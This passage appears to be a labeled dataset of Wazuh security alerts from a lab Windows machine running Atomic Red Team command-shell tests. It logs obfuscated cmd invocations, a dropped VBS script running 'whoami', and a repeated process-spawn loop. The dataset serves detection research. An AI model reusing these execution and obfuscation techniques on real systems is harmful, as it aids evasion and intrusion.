{"id": "uxfX1pcB1Hp-jZ7fiqlw", "description": "Command shell started script with /c modifier", "label": "TP", "rule_level": 4, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.04", "_id": "uxfX1pcB1Hp-jZ7fiqlw", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "wscript.exe", "image": "C:\\\\Windows\\\\System32\\\\wscript.exe", "product": "Microsoft \u00ae Windows Script Host", "parentProcessGuid": "{ff3427f9-26c7-6868-1402-000000001400}", "description": "Microsoft \u00ae Windows Based Script Host", "logonGuid": "{ff3427f9-1e7f-6868-f045-0a0000000000}", "parentCommandLine": "\\\"cmd.exe\\\" /c c:\\\\windows\\\\system32\\\\cmd.exe /c cd /d %TEMP%\\\\ &amp; echo Set objShell = CreateObject(\\\"WScript.Shell\\\"):Set objExec = objShell.Exec(\\\"whoami\\\"):Set objExec = Nothing:Set objShell = Nothing &gt; AtomicTest.vbs &amp; AtomicTest.vbs", "processGuid": "{ff3427f9-26c7-6868-1802-000000001400}", "logonId": "0xa45f0", "parentProcessId": "7940", "processId": "5208", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-04 19:08:55.941", "hashes": "SHA1=F17CFCD2BDA29421AD37F8764C514396A1DEA7C9,MD5=60933788CB36C3EE2199626C5EC8ADA0,SHA256=7D31A31136319D0A277C7FB0E9BBCB46BA3535A42AEB0307FED70F92649F4162,IMPHASH=EE6DDCBA60642B0ADD3CAB9EA721BEE2", "parentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe", "ruleName": "technique_id=T1059,technique_name=Command-Line Interface", "company": "Microsoft Corporation", "commandLine": "\\\"C:\\\\WINDOWS\\\\System32\\\\WScript.exe\\\" \\\"C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\AtomicTest.vbs\\\"", "integrityLevel": "High", "fileVersion": "5.812.10240.16384", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2025-07-04 19:08:55.941\r\nProcessGuid: {ff3427f9-26c7-6868-1802-000000001400}\r\nProcessId: 5208\r\nImage: C:\\Windows\\System32\\wscript.exe\r\nFileVersion: 5.812.10240.16384\r\nDescription: Microsoft \u00ae Windows Based Script Host\r\nProduct: Microsoft \u00ae Windows Script Host\r\nCompany: Microsoft Corporation\r\nOriginalFileName: wscript.exe\r\nCommandLine: \"C:\\WINDOWS\\System32\\WScript.exe\" \"C:\\Users\\snell\\AppData\\Local\\Temp\\AtomicTest.vbs\" \r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}\r\nLogonId: 0xA45F0\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=F17CFCD2BDA29421AD37F8764C514396A1DEA7C9,MD5=60933788CB36C3EE2199626C5EC8ADA0,SHA256=7D31A31136319D0A277C7FB0E9BBCB46BA3535A42AEB0307FED70F92649F4162,IMPHASH=EE6DDCBA60642B0ADD3CAB9EA721BEE2\r\nParentProcessGuid: {ff3427f9-26c7-6868-1402-000000001400}\r\nParentProcessId: 7940\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"cmd.exe\" /c c:\\windows\\system32\\cmd.exe /c cd /d %TEMP%\\ & echo Set objShell = CreateObject(\"WScript.Shell\"):Set objExec = objShell.Exec(\"whoami\"):Set objExec = Nothing:Set objShell = Nothing > AtomicTest.vbs & AtomicTest.vbs\r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-04T19:08:55.9462176Z", "eventRecordID": "148870", "threadID": "3992", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3056", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 1, "mail": false, "description": "Command shell started script with /c modifier", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["Command and Scripting Interpreter"], "id": ["T1059"], "tactic": ["Execution"]}, "id": "92005"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751656136.54917443", "timestamp": "2025-07-04T19:08:56.593+0000"}, "fields": {"timestamp": ["2025-07-04T19:08:56.593Z"]}, "sort": [1751656136593]}}
{"id": "uRfX1pcB1Hp-jZ7fiqlw", "description": "Suspicious Windows cmd shell execution", "label": "TP", "rule_level": 3, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.04", "_id": "uRfX1pcB1Hp-jZ7fiqlw", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "Cmd.Exe", "image": "C:\\\\Windows\\\\System32\\\\cmd.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-26c7-6868-1402-000000001400}", "description": "Windows Command Processor", "logonGuid": "{ff3427f9-1e7f-6868-f045-0a0000000000}", "parentCommandLine": "\\\"cmd.exe\\\" /c c:\\\\windows\\\\system32\\\\cmd.exe /c cd /d %TEMP%\\\\ &amp; echo Set objShell = CreateObject(\\\"WScript.Shell\\\"):Set objExec = objShell.Exec(\\\"whoami\\\"):Set objExec = Nothing:Set objShell = Nothing &gt; AtomicTest.vbs &amp; AtomicTest.vbs", "processGuid": "{ff3427f9-26c7-6868-1602-000000001400}", "logonId": "0xa45f0", "parentProcessId": "7940", "processId": "4420", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-04 19:08:55.586", "hashes": "SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6", "parentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe", "ruleName": "technique_id=T1059,technique_name=Command-Line Interface", "company": "Microsoft Corporation", "commandLine": "c:\\\\windows\\\\system32\\\\cmd.exe  /c cd /d C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "integrityLevel": "High", "fileVersion": "10.0.26100.4202 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2025-07-04 19:08:55.586\r\nProcessGuid: {ff3427f9-26c7-6868-1602-000000001400}\r\nProcessId: 4420\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.26100.4202 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: c:\\windows\\system32\\cmd.exe  /c cd /d C:\\Users\\snell\\AppData\\Local\\Temp\\ \r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}\r\nLogonId: 0xA45F0\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6\r\nParentProcessGuid: {ff3427f9-26c7-6868-1402-000000001400}\r\nParentProcessId: 7940\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"cmd.exe\" /c c:\\windows\\system32\\cmd.exe /c cd /d %TEMP%\\ & echo Set objShell = CreateObject(\"WScript.Shell\"):Set objExec = objShell.Exec(\"whoami\"):Set objExec = Nothing:Set objShell = Nothing > AtomicTest.vbs & AtomicTest.vbs\r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-04T19:08:55.5898040Z", "eventRecordID": "148863", "threadID": "3992", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3056", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 4, "mail": false, "description": "Suspicious Windows cmd shell execution", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["Account Discovery", "Windows Command Shell"], "id": ["T1087", "T1059.003"], "tactic": ["Discovery", "Execution"]}, "id": "92032"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751656136.54907914", "timestamp": "2025-07-04T19:08:56.497+0000"}, "fields": {"timestamp": ["2025-07-04T19:08:56.497Z"]}, "sort": [1751656136497]}}
{"id": "tRfX1pcB1Hp-jZ7ffqm0", "description": "Windows command prompt started by an abnormal process", "label": "TP", "rule_level": 4, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.04", "_id": "tRfX1pcB1Hp-jZ7ffqm0", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "Cmd.Exe", "image": "C:\\\\Windows\\\\System32\\\\cmd.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-2077-6868-5c01-000000001400}", "description": "Windows Command Processor", "logonGuid": "{ff3427f9-1e7f-6868-f045-0a0000000000}", "parentCommandLine": "\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\"", "processGuid": "{ff3427f9-26c5-6868-0c02-000000001400}", "logonId": "0xa45f0", "parentProcessId": "9196", "processId": "5676", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-04 19:08:53.181", "hashes": "SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6", "parentImage": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "ruleName": "technique_id=T1059,technique_name=Command-Line Interface", "company": "Microsoft Corporation", "commandLine": "\\\"cmd.exe\\\" /c cmd /r cmd&lt;\\\"C:\\\\AtomicRedTeam\\\\atomics\\\\T1059.003\\\\src\\\\t1059.003_cmd.cmd\\\"", "integrityLevel": "High", "fileVersion": "10.0.26100.4202 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2025-07-04 19:08:53.181\r\nProcessGuid: {ff3427f9-26c5-6868-0c02-000000001400}\r\nProcessId: 5676\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.26100.4202 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: \"cmd.exe\" /c cmd /r cmd<\"C:\\AtomicRedTeam\\atomics\\T1059.003\\src\\t1059.003_cmd.cmd\"\r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}\r\nLogonId: 0xA45F0\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6\r\nParentProcessGuid: {ff3427f9-2077-6868-5c01-000000001400}\r\nParentProcessId: 9196\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" \r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-04T19:08:53.1831592Z", "eventRecordID": "148840", "threadID": "3992", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3056", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 3, "mail": false, "description": "Windows command prompt started by an abnormal process", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["Windows Command Shell"], "id": ["T1059.003"], "tactic": ["Execution"]}, "id": "92052"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751656134.54882346", "timestamp": "2025-07-04T19:08:54.383+0000"}, "fields": {"timestamp": ["2025-07-04T19:08:54.383Z"]}, "sort": [1751656134383]}}
{"id": "rBfX1pcB1Hp-jZ7fHakA", "description": "Powershell process spawned Windows command shell instance", "label": "TP", "rule_level": 4, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.04", "_id": "rBfX1pcB1Hp-jZ7fHakA", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "Cmd.Exe", "image": "C:\\\\Windows\\\\System32\\\\cmd.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-26ab-6868-0702-000000001400}", "description": "Windows Command Processor", "logonGuid": "{ff3427f9-1e7f-6868-f045-0a0000000000}", "parentCommandLine": "\\\"powershell.exe\\\" &amp; {cmd /c \\\\\\\"\\\"for /l %x in (1,1,75) do start wordpad.exe /p C:\\\\AtomicRedTeam\\\\atomics\\\\..\\\\ExternalPayloads\\\\T1059_003note.txt\\\\\\\"\\\" | out-null}", "processGuid": "{ff3427f9-26ac-6868-0902-000000001400}", "logonId": "0xa45f0", "parentProcessId": "10212", "processId": "9076", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-04 19:08:28.189", "hashes": "SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6", "parentImage": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "ruleName": "technique_id=T1059,technique_name=Command-Line Interface", "company": "Microsoft Corporation", "commandLine": "\\\"C:\\\\WINDOWS\\\\system32\\\\cmd.exe\\\" /c \\\"for /l %%x in (1,1,75) do start wordpad.exe /p C:\\\\AtomicRedTeam\\\\atomics\\\\..\\\\ExternalPayloads\\\\T1059_003note.txt\\\"", "integrityLevel": "High", "fileVersion": "10.0.26100.4202 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2025-07-04 19:08:28.189\r\nProcessGuid: {ff3427f9-26ac-6868-0902-000000001400}\r\nProcessId: 9076\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.26100.4202 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: \"C:\\WINDOWS\\system32\\cmd.exe\" /c \"for /l %%x in (1,1,75) do start wordpad.exe /p C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\T1059_003note.txt\"\r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}\r\nLogonId: 0xA45F0\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6\r\nParentProcessGuid: {ff3427f9-26ab-6868-0702-000000001400}\r\nParentProcessId: 10212\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: \"powershell.exe\" & {cmd /c \\\"\"for /l %x in (1,1,75) do start wordpad.exe /p C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\T1059_003note.txt\\\"\" | out-null}\r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-04T19:08:28.1907111Z", "eventRecordID": "148830", "threadID": "3992", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3056", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 3, "mail": false, "description": "Powershell process spawned Windows command shell instance", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["Windows Command Shell"], "id": ["T1059.003"], "tactic": ["Execution"]}, "id": "92004"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751656109.54837024", "timestamp": "2025-07-04T19:08:29.286+0000"}, "fields": {"timestamp": ["2025-07-04T19:08:29.286Z"]}, "sort": [1751656109286]}}
{"id": "qBfX1pcB1Hp-jZ7fGaka", "description": "Suspicious Windows cmd shell execution", "label": "TP", "rule_level": 3, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.04", "_id": "qBfX1pcB1Hp-jZ7fGaka", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "Cmd.Exe", "image": "C:\\\\Windows\\\\System32\\\\cmd.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-26ab-6868-0402-000000001400}", "description": "Windows Command Processor", "logonGuid": "{ff3427f9-1e7f-6868-f045-0a0000000000}", "parentCommandLine": "\\\"cmd.exe\\\" /c %LOCALAPPDATA:~-3,1%md /c echo Hello, from CMD! &gt; hello.txt &amp; type hello.txt", "processGuid": "{ff3427f9-26ab-6868-0602-000000001400}", "logonId": "0xa45f0", "parentProcessId": "7572", "processId": "4800", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-04 19:08:27.673", "hashes": "SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6", "parentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe", "ruleName": "technique_id=T1059,technique_name=Command-Line Interface", "company": "Microsoft Corporation", "commandLine": "cmd  /c echo Hello, from CMD!", "integrityLevel": "High", "fileVersion": "10.0.26100.4202 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2025-07-04 19:08:27.673\r\nProcessGuid: {ff3427f9-26ab-6868-0602-000000001400}\r\nProcessId: 4800\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.26100.4202 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: cmd  /c echo Hello, from CMD!  \r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}\r\nLogonId: 0xA45F0\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6\r\nParentProcessGuid: {ff3427f9-26ab-6868-0402-000000001400}\r\nParentProcessId: 7572\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"cmd.exe\" /c %LOCALAPPDATA:~-3,1%md /c echo Hello, from CMD! > hello.txt & type hello.txt\r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-04T19:08:27.6748229Z", "eventRecordID": "148806", "threadID": "3992", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3056", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 1, "mail": false, "description": "Suspicious Windows cmd shell execution", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["Account Discovery", "Windows Command Shell"], "id": ["T1087", "T1059.003"], "tactic": ["Discovery", "Execution"]}, "id": "92032"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751656108.54818423", "timestamp": "2025-07-04T19:08:28.293+0000"}, "fields": {"timestamp": ["2025-07-04T19:08:28.293Z"]}, "sort": [1751656108293]}}
{"id": "pxfX1pcB1Hp-jZ7fGaka", "description": "Windows command prompt started by an abnormal process", "label": "TP", "rule_level": 4, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.04", "_id": "pxfX1pcB1Hp-jZ7fGaka", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "Cmd.Exe", "image": "C:\\\\Windows\\\\System32\\\\cmd.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-2077-6868-5c01-000000001400}", "description": "Windows Command Processor", "logonGuid": "{ff3427f9-1e7f-6868-f045-0a0000000000}", "parentCommandLine": "\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\"", "processGuid": "{ff3427f9-26ab-6868-0402-000000001400}", "logonId": "0xa45f0", "parentProcessId": "9196", "processId": "7572", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-04 19:08:27.640", "hashes": "SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6", "parentImage": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "ruleName": "technique_id=T1059,technique_name=Command-Line Interface", "company": "Microsoft Corporation", "commandLine": "\\\"cmd.exe\\\" /c %%LOCALAPPDATA:~-3,1%%md /c echo Hello, from CMD! &gt; hello.txt &amp; type hello.txt", "integrityLevel": "High", "fileVersion": "10.0.26100.4202 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2025-07-04 19:08:27.640\r\nProcessGuid: {ff3427f9-26ab-6868-0402-000000001400}\r\nProcessId: 7572\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.26100.4202 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: \"cmd.exe\" /c %%LOCALAPPDATA:~-3,1%%md /c echo Hello, from CMD! > hello.txt & type hello.txt\r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}\r\nLogonId: 0xA45F0\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6\r\nParentProcessGuid: {ff3427f9-2077-6868-5c01-000000001400}\r\nParentProcessId: 9196\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" \r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-04T19:08:27.6417936Z", "eventRecordID": "148801", "threadID": "3992", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3056", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 2, "mail": false, "description": "Windows command prompt started by an abnormal process", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["Windows Command Shell"], "id": ["T1059.003"], "tactic": ["Execution"]}, "id": "92052"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751656108.54811952", "timestamp": "2025-07-04T19:08:28.231+0000"}, "fields": {"timestamp": ["2025-07-04T19:08:28.231Z"]}, "sort": [1751656108231]}}
{"id": "phfX1pcB1Hp-jZ7fGaka", "description": "Windows command prompt started by an abnormal process", "label": "TP", "rule_level": 4, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.04", "_id": "phfX1pcB1Hp-jZ7fGaka", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "Cmd.Exe", "image": "C:\\\\Windows\\\\System32\\\\cmd.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-2077-6868-5c01-000000001400}", "description": "Windows Command Processor", "logonGuid": "{ff3427f9-1e7f-6868-f045-0a0000000000}", "parentCommandLine": "\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\"", "processGuid": "{ff3427f9-26ab-6868-0202-000000001400}", "logonId": "0xa45f0", "parentProcessId": "9196", "processId": "10208", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-04 19:08:27.383", "hashes": "SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6", "parentImage": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "ruleName": "technique_id=T1059,technique_name=Command-Line Interface", "company": "Microsoft Corporation", "commandLine": "\\\"cmd.exe\\\" /c echo \\\"Hello from the Windows Command Prompt!\\\" &gt; \\\"%%TEMP%%\\\\test.bin\\\" &amp; type 